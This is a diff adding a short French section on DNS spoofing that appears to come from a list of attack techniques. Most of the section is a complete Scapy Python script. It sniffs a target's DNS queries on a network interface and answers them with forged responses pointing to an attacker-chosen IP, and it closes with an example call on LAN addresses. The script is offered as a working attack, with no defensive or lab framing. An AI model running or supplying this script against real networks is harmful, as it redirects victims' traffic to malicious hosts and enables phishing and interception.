@@ -1,0 +1,24 @@
+3. Usurpation de service DNS
+Une attaque DNS spoofing modifie les réponses DNS pour rediriger les victimes vers des sites malveillants.
+
+
+
+from scapy.all import *
+
+def dns_spoof(interface, target_ip, fake_ip):
+    def process_packet(packet):
+        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # QR=0 signifie une requête DNS
+            spoofed_response = Ether(dst=packet[Ether].src) / \
+                               IP(src=packet[IP].dst, dst=packet[IP].src) / \
+                               UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
+                               DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, rdata=fake_ip))
+            sendp(spoofed_response, iface=interface, verbose=False)
+            print(f"Redirection DNS pour {packet[DNS].qd.qname.decode()} vers {fake_ip}")
+
+    sniff(iface=interface, filter=f"udp port 53 and ip src {target_ip}", prn=process_packet)
+
+# Interface, cible et IP malveillante (exemple : 192.168.1.5 => fake IP 192.168.1.100)
+dns_spoof("eth0", "192.168.1.5", "192.168.1.100")
+
+
+
